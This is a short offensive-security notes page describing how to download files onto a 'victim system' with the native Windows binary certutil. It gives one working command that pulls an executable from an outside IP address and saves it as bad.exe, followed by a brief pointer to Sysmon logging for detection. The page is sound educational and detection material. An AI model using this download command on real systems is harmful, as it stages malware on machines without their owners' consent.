---
description: Downloading additional files to the victim system using native OS binary.
---

# Downloading Files with Certutil

## Execution

```csharp
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```

![](../../.gitbook/assets/certutil-download.gif)

## Observations

Sysmon commandling logging is a good place to start for monitoring suspicious `certutil.exe` behaviour:

![](../../.gitbook/assets/certutil-sysmon.png)

